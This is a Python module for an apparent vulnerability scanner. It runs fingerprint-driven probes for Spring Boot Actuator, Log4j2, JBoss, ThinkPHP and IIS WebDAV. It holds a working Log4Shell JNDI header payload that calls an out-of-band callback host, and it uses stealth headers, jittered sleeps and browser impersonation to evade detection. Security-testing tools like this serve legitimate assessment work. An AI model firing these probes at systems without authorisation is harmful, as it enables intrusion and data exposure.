"""
POC引擎：漏洞验证框架
支持优先级、超时控制、置信度评分、并发执行
"""
from curl_cffi import requests
import time
import json
import os
import concurrent.futures
from typing import Dict, List, Optional, Callable, Any
from datetime import datetime
from abc import ABC, abstractmethod
from config import Config
from core.evasion import get_stealth_headers, smart_sleep
from core.models import Vulnerability, Severity, VulnType
from logger import get_logger

# 引入OOB盲打引擎
from core.oob_engine import OOBEngine

logger = get_logger("poc_engine")
oob = OOBEngine()


# ==========================================
# BasePOC 基类：统一的POC执行框架
# ==========================================
class BasePOC(ABC):
    """
    POC基类：所有POC都应继承此类
    提供超时控制、异常处理、置信度评分等统一框架
    """

    def __init__(self, name: str, severity: Severity, poc_type: VulnType, timeout: int = 5):
        """
        初始化POC

        参数:
            name: POC名称
            severity: 漏洞严重等级
            poc_type: 漏洞类型
            timeout: 执行超时时间（秒）
        """
        self.name = name
        self.severity = severity
        self.poc_type = poc_type
        self.timeout = timeout

    @abstractmethod
    def _check(self, url: str) -> Optional[Dict[str, Any]]:
        """
        实现具体的检查逻辑

        参数:
            url: 目标URL

        返回:
            如果检测到漏洞，返回漏洞信息字典；否则返回None
        """
        pass

    def execute(self, url: str) -> Optional[Vulnerability]:
        """
        执行POC，带超时控制和异常处理

        参数:
            url: 目标URL

        返回:
            Vulnerability对象或None
        """
        try:
            # 使用timeout避免某个POC卡住整个执行
            result = self._execute_with_timeout(url)
            if result:
                return Vulnerability(
                    vuln_name=result.get("vuln_name", self.name),
                    payload_url=result.get("payload_url", url),
                    severity=result.get("severity", self.severity),
                    vuln_type=result.get("vuln_type", self.poc_type),
                    discovered_at=result.get("discovered_at", datetime.now().isoformat()),
                    confidence=result.get("confidence", 0.8)
                )
        except Exception as e:
            logger.debug(f"  [-] {self.name} POC执行异常: {e}")

        return None

    def _execute_with_timeout(self, url: str) -> Optional[Dict[str, Any]]:
        """使用线程超时执行check方法"""
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            future = executor.submit(self._check, url)
            try:
                return future.result(timeout=self.timeout)
            except concurrent.futures.TimeoutError:
                logger.debug(f"  [-] {self.name} POC执行超时 ({self.timeout}s): {url}")
                future.cancel()
                return None


# ==========================================
# POC 配置和优先级系统
# ==========================================
def _get_default_registry():
    """内置默认POC注册表（当配置文件加载失败时使用）"""
    return {
        "Spring Boot": {
            "priority": 1,
            "confidence_baseline": 0.85,
            "pocs": {
                "check_springboot_actuator": {"severity": "CRITICAL", "confidence": 0.95, "timeout": 3},
                "check_log4j2_oob": {"severity": "CRITICAL", "confidence": 0.90, "timeout": 5}
            }
        },
        "Apache Shiro": {
            "priority": 2,
            "confidence_baseline": 0.80,
            "pocs": {
                "check_shiro_rce": {"severity": "HIGH", "confidence": 0.85, "timeout": 3}
            }
        }
    }

def _load_registry_from_json() -> Dict:
    """从pocs.json动态加载POC配置"""
    try:
        # 定位pocs.json (假设在项目根目录)
        root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        json_path = os.path.join(root_dir, 'pocs.json')
        
        if not os.path.exists(json_path):
            logger.warning(f"[-] 未找到POC配置文件: {json_path}，使用内置默认配置")
            return _get_default_registry()

        with open(json_path, 'r', encoding='utf-8') as f:
            data = json.load(f)

        registry = {}
        
        # 1. 加载框架基础配置
        for fw_name, fw_info in data.get('frameworks', {}).items():
            registry[fw_name] = {
                "priority": fw_info.get('priority', 5),
                "confidence_baseline": fw_info.get('confidence_baseline', 0.5),
                "pocs": {}
            }

        # 2. 加载并注册POC
        loaded_count = 0
        for poc in data.get('pocs', []):
            if not poc.get('enabled', False):
                continue
                
            fw = poc.get('framework')
            if fw not in registry:
                # 如果框架未在frameworks中定义，使用默认值初始化
                registry[fw] = {"priority": poc.get('priority', 5), "confidence_baseline": 0.5, "pocs": {}}
            
            for impl in poc.get('implementations', []):
                registry[fw]['pocs'][impl] = {
                    "severity": poc.get('severity', 'UNKNOWN'),
                    "confidence": poc.get('confidence', 0.5),
                    "timeout": poc.get('timeout', Config.POC_TIMEOUT)
                }
                loaded_count += 1
        
        logger.info(f"[*] POC引擎初始化完成: 从pocs.json加载了 {loaded_count} 个规则")
        return registry

    except Exception as e:
        logger.error(f"[-] 加载POC配置失败: {e}，回退到默认配置")
        return _get_default_registry()

POC_REGISTRY = _load_registry_from_json()


# ==========================================
# POC 实现函数
# ==========================================
def check_springboot_actuator(url: str) -> Optional[Vulnerability]:
    """Spring Boot Actuator 敏感信息泄露"""
    target_url = f"{url.rstrip('/')}/actuator/env"
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()
        res = requests.get(
            target_url,
            headers=headers,
            verify=False,
            timeout=Config.POC_TIMEOUT,
            impersonate="chrome120"
        )
        if res.status_code == 200 and "activeProfiles" in res.text:
            return Vulnerability(
                vuln_name="Spring Boot Actuator 敏感信息泄露",
                payload_url=target_url,
                severity=Severity.CRITICAL,
                vuln_type=VulnType.INFORMATION_DISCLOSURE,
                discovered_at=datetime.now().isoformat(),
                confidence=0.95
            )
    except Exception as e:
        logger.debug(f"  [-] Spring Boot Actuator POC失败: {e}")

    return None


def check_log4j2_oob(url: str) -> Optional[Vulnerability]:
    """Log4j2 JNDI 远程代码执行 (OOB检测)"""
    if not Config.OOB_ENABLED:
        return None

    try:
        unique_id, oob_url = oob.generate_payload()
        payload = f"${{jndi:ldap://{oob_url}/a}}"

        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()
        headers['X-Api-Version'] = payload
        headers['User-Agent'] = payload

        requests.get(
            url,
            headers=headers,
            verify=False,
            timeout=Config.POC_TIMEOUT,
            impersonate="chrome120"
        )

        # 等待回调
        time.sleep(min(Config.OOB_TIMEOUT, 15))

        if oob.verify(unique_id):
            return Vulnerability(
                vuln_name="Log4j2 JNDI 远程代码执行",
                payload_url=f"Header Injection: {payload}",
                severity=Severity.CRITICAL,
                vuln_type=VulnType.REMOTE_CODE_EXECUTION,
                discovered_at=datetime.now().isoformat(),
                confidence=0.90
            )
    except Exception as e:
        logger.debug(f"  [-] Log4j2 OOB POC失败: {e}")

    return None


def check_nginx_version(url: str) -> Optional[Vulnerability]:
    """Nginx 版本信息泄露检测"""
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()
        res = requests.get(
            url,
            headers=headers,
            verify=False,
            timeout=Config.POC_TIMEOUT,
            impersonate="chrome120"
        )

        server_header = res.headers.get('Server', '')
        if 'nginx' in server_header.lower():
            return Vulnerability(
                vuln_name=f"Nginx {server_header} 版本泄露",
                payload_url=url,
                severity=Severity.LOW,
                vuln_type=VulnType.INFORMATION_DISCLOSURE,
                discovered_at=datetime.now().isoformat(),
                confidence=0.85
            )
    except Exception as e:
        logger.debug(f"  [-] Nginx版本检测失败: {e}")

    return None


def check_iis_webdav(url: str) -> Optional[Vulnerability]:
    """IIS WebDAV RCE检测"""
    # 简化版本：检测OPTIONS方法是否暴露WebDAV
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()

        # 尝试OPTIONS请求
        res = requests.options(
            url,
            headers=headers,
            verify=False,
            timeout=Config.POC_TIMEOUT,
            impersonate="chrome120"
        )

        # 检查DAV头部
        allow_header = res.headers.get('Allow', '')
        dav_header = res.headers.get('DAV', '')

        if 'PROPFIND' in allow_header or dav_header:
            return Vulnerability(
                vuln_name="IIS WebDAV 可能存在RCE漏洞",
                payload_url=url,
                severity=Severity.HIGH,
                vuln_type=VulnType.REMOTE_CODE_EXECUTION,
                discovered_at=datetime.now().isoformat(),
                confidence=0.75
            )
    except Exception as e:
        logger.debug(f"  [-] IIS WebDAV检测失败: {e}")

    return None


def check_thinkphp_rce(url: str) -> Optional[Vulnerability]:
    """ThinkPHP RCE检测（简化版）"""
    # 这是简化实现，实际需要特定payload
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()

        # ThinkPHP的典型RCE路由
        test_urls = [
            f"{url.rstrip('/')}/index.php?m=Home&c=Index&a=test",
            f"{url.rstrip('/')}/index.php/Home/Index/test",
        ]

        for test_url in test_urls:
            res = requests.get(
                test_url,
                headers=headers,
                verify=False,
                timeout=Config.POC_TIMEOUT,
                impersonate="chrome120"
            )

            if res.status_code == 200 and 'thinkphp' in res.text.lower():
                return Vulnerability(
                    vuln_name="ThinkPHP 可能存在RCE漏洞",
                    payload_url=test_url,
                    severity=Severity.HIGH,
                    vuln_type=VulnType.REMOTE_CODE_EXECUTION,
                    discovered_at=datetime.now().isoformat(),
                    confidence=0.70
                )
    except Exception as e:
        logger.debug(f"  [-] ThinkPHP RCE检测失败: {e}")

    return None


def check_jboss_deserialization(url: str) -> Optional[Vulnerability]:
    """JBoss 反序列化RCE检测"""
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()

        # JBoss的典型不安全端点
        jboss_paths = [
            '/jmx-console/',
            '/jbossws/services',
            '/invoker/EJBInvokerServlet',
        ]

        for path in jboss_paths:
            test_url = url.rstrip('/') + path
            try:
                res = requests.head(
                    test_url,
                    headers=headers,
                    verify=False,
                    timeout=Config.POC_TIMEOUT,
                    impersonate="chrome120"
                )

                if res.status_code == 200:
                    return Vulnerability(
                        vuln_name=f"JBoss {path} 端点暴露",
                        payload_url=test_url,
                        severity=Severity.HIGH,
                        vuln_type=VulnType.REMOTE_CODE_EXECUTION,
                        discovered_at=datetime.now().isoformat(),
                        confidence=0.80
                    )
            except Exception as e:
                logger.debug(f"[*] JBoss检测失败 ({test_url}): {type(e).__name__}")
    except Exception as e:
        logger.debug(f"  [-] JBoss检测失败: {e}")

    return None


# ==========================================
# POC 管理和执行函数
# ==========================================
def run_pocs(url: str, fingerprints: List[str]) -> List[Vulnerability]:
    """
    按优先级执行POC（并发执行）
    基于指纹识别结果执行对应的漏洞检测
    使用ThreadPoolExecutor实现POC并行执行，提高扫描效率

    参数:
        url: 目标URL
        fingerprints: 指纹识别结果列表

    返回:
        发现的漏洞列表
    """
    discovered_vulns: List[Vulnerability] = []
    executed_pocs = set()  # 避免重复执行同一个POC

    # 按优先级排序指纹
    sorted_fps = sorted(
        fingerprints,
        key=lambda fp: POC_REGISTRY.get(fp, {}).get("priority", 999)
    )

    # 用于并发执行的POC任务队列
    poc_tasks: List[tuple] = []  # (poc_name, poc_func, poc_meta)

    for fp in sorted_fps:
        if fp not in POC_REGISTRY:
            continue

        poc_config = POC_REGISTRY[fp]
        poc_list = poc_config.get("pocs", {})

        if not poc_list:
            continue

        logger.info(f"    [>] 触发 {fp} 漏洞检测")

        for poc_name, poc_meta in poc_list.items():
            # 避免重复执行相同POC
            if poc_name in executed_pocs:
                continue

            executed_pocs.add(poc_name)

            # 获取POC函数
            poc_func = globals().get(poc_name)
            if not poc_func:
                logger.warning(f"      [-] POC函数不存在: {poc_name}")
                continue

            # 添加到任务队列（不立即执行）
            poc_tasks.append((poc_name, poc_func, poc_meta))

    # ===== 并发执行所有POC任务 =====
    max_workers = min(len(poc_tasks), Config.THREADS_DEFAULT // 2)  # 不超过总线程数的一半
    if max_workers < 1:
        max_workers = 1

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # 提交所有POC任务
        futures = {
            executor.submit(_execute_single_poc, url, poc_name, poc_func, poc_meta['timeout'] if 'timeout' in poc_meta else 5): (poc_name, poc_meta)
            for poc_name, poc_func, poc_meta in poc_tasks
        }

        # 收集执行结果
        for future in concurrent.futures.as_completed(futures):
            poc_name, poc_meta = futures[future]
            try:
                result = future.result()
                if result:
                    discovered_vulns.append(result)
                    confidence = poc_meta.get("confidence", 0.8)
                    logger.info(
                        f"      [!!!] 成功验证: {result.vuln_name} "
                        f"(置信度: {confidence*100:.0f}%)"
                    )
            except Exception as e:
                logger.debug(f"      [-] POC执行异常 {poc_name}: {e}")

    return discovered_vulns


def _execute_single_poc(url: str, poc_name: str, poc_func: Callable, timeout: int) -> Optional[Vulnerability]:
    """
    执行单个POC，带超时控制

    参数:
        url: 目标URL
        poc_name: POC名称
        poc_func: POC函数
        timeout: 超时时间

    返回:
        Vulnerability对象或None
    """
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            future = executor.submit(poc_func, url)
            result = future.result(timeout=timeout)
            return result
    except concurrent.futures.TimeoutError:
        logger.debug(f"  [-] {poc_name} POC执行超时 ({timeout}s)")
        return None
    except Exception as e:
        logger.debug(f"  [-] {poc_name} POC执行异常: {e}")
        return None
